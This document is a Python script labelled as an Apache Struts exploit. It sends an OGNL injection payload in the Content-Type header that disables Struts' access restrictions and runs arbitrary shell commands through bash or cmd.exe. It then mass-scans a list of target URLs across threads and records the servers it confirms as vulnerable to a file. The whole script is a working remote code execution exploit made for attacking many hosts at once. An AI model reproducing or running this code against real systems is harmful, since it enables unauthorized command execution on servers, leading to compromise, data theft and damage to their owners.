import requests
import threading
import sys

print('Apache Struts Exploit @NorseGroup #Flet')

try:
    lista = open(sys.argv[1], 'r')
    threads = int(sys.argv[2])
    lista = lista.readlines()
except:
    print(sys.argv[0], '[list] [threads]')
    sys.exit()

def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = requests.get(url=url, headers=headers, timeout=6)
        page = request.text
        page = ('#Exploited {0} [{1}]'.format(url, page))
        if 'Fletao' in request.text:
            salvo = open('apacheexploiteds.txt', 'a')
            salvo.write('#Exploited {0}\n'.format(url))
            salvo.close()
        else:
            page = ('#Die {0}'.format(url))
    except:
        page = ('#Die {0}'.format(url))
    return page

tcounter = -1
def inicio():
    global lista
    global tcounter
    for link in lista:
        tcounter = tcounter + 1
        if tcounter > len(lista):
            sys.exit()
        else:
            link = lista[tcounter]
            link = link.strip()
            cmd = 'echo Fletao'
            result = exploit(link, cmd)
            print(result)

for i in range(threads):
    t = threading.Thread(target=inicio)
    t.start()
